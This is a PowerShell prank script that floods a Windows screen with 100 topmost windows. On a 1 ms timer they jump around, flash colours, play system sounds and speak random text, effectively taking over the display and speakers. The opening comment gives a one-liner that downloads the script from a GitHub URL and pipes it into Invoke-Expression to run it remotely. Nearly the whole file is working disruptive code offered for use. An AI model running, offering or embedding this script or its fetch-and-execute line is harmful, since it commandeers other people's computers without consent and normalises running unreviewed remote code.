# Run Remotely: iwr -useb https://raw.githubusercontent.com/twojapiez/twojapiez/refs/heads/main/a.ps1 | iex
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Speech
Add-Type -AssemblyName System.Media
$screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
$screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
$windowCount = 100
$minSize = 200
$maxSize = 1000
$random = New-Object System.Random
$synthesizer = New-Object System.Speech.Synthesis.SpeechSynthesizer
$soundNames = @("Asterisk", "Beep", "Exclamation", "Hand", "Question")
function Get-RandomString {
    $length = $random.Next(33, 132)
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    $sb = New-Object System.Text.StringBuilder
    for ($i = 0; $i -lt $length; $i++) {
        $sb.Append($chars[$random.Next(0, $chars.Length)]) | Out-Null
    }
    return $sb.ToString()
}
function Play-RandomSystemSound {
    $soundName = $soundNames[$random.Next(0, $soundNames.Count)]
    [System.Media.SystemSounds]::$soundName.Play()
	Start-Sleep -Milliseconds 10
}
function Say-RandomPhrase {
    $randomString = Get-RandomString
    $null = $synthesizer.SpeakAsync($randomString)
}
$windows = @()

for ($i = 0; $i -lt $windowCount; $i++) {
    $form = New-Object System.Windows.Forms.Form
    $form.FormBorderStyle = 'None'
    $form.TopMost = $true
    $form.StartPosition = "Manual"

    $size = $random.Next($minSize, $maxSize)
    $form.Width = $size
    $form.Height = $size

    $form.Left = $random.Next(0, $screenWidth - $form.Width)
    $form.Top = $random.Next(0, $screenHeight - $form.Height)

    $form.BackColor = [System.Drawing.Color]::FromArgb($random.Next(256), $random.Next(256), $random.Next(256))
    $label = New-Object System.Windows.Forms.Label
    $label.AutoSize = $false
    $label.Dock = "Fill"
    $label.TextAlign = "MiddleCenter"
    $label.Font = New-Object System.Drawing.Font("Consolas", 10, [System.Drawing.FontStyle]::Bold)
    $label.ForeColor = [System.Drawing.Color]::White
    $label.BackColor = [System.Drawing.Color]::Transparent

    $form.Controls.Add($label)

    $form.Show()

    $windows += [pscustomobject]@{
        Form = $form
        Label = $label
        PrevColor = $form.BackColor
    }
}
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 1
$timer.Add_Tick({
    foreach ($w in $windows) {
        $form = $w.Form
        $label = $w.Label
        $newSize = if ($random.Next(2) -eq 0) { $minSize } else { $maxSize }
        $form.Width = $newSize
        $form.Height = $newSize
        $form.Left = $random.Next(0, $screenWidth - $form.Width)
        $form.Top = $random.Next(0, $screenHeight - $form.Height)
        $r = $random.Next(256)
        $g = $random.Next(256)
        $b = $random.Next(256)
        $newColor = [System.Drawing.Color]::FromArgb($r, $g, $b)
        $label.Text = Get-RandomString
        if ($newColor.ToArgb() -ne $w.PrevColor.ToArgb()) {
            $form.BackColor = $newColor
            $w.PrevColor = $newColor
            Play-RandomSystemSound
            Say-RandomPhrase
			Start-Sleep -Milliseconds 10
        }
    }
})
$timer.Start()
[System.Windows.Forms.Application]::Run()
